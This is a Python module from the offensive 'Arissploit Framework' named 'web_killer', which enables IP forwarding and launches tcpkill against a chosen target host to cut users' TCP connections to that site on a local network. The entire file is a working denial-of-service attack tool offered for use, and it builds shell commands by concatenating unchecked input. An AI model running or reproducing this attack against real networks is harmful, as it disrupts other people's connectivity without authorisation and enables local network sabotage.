#!/usr/bin/env python3

#            ---------------------------------------------------
#                           Arissploit Framework                                 
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

from core.arissploit import *
import time
import os
import subprocess
from core import colors

conf = {
	"name": "web_killer",
	"version": "1.0",
	"shortdesc": "TCP attack arranger.",
	"author": "Entynetproject",
	"initdate": "24.2.2019",
	"lastmod": "29.12.2019",
	"apisupport": False,
	"dependencies": ["dnsiff"]
}

# List of the variables
variables = OrderedDict((
	('interface', ['wlan0', 'Network interface name.']),
	('target', ['google.com', 'Target web address.']),

))

# Simple changelog
changelog = "Version 1.0:\nrelease"

# Run
def run():
	variables['target'][0] = variables['target'][0].replace("http://", "")
	variables['target'][0] = variables['target'][0].replace("https://", "")
	printInfo("IP forwarding...")
	subprocess.Popen('echo 1 > /proc/sys/net/ipv4/ip_forward', stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	time.sleep(2)
	command_1 = 'tcpkill -i ' + variables['interface'][0] +' -9 host ' + variables['target'][0]
	subprocess.Popen(command_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
	line_3 = colors.green + "Attack has been started, to stop attack press [enter]"
	press_ak = input(line_3)
	os.system('killall tcpkill')
	printInform("Attack stopped.")
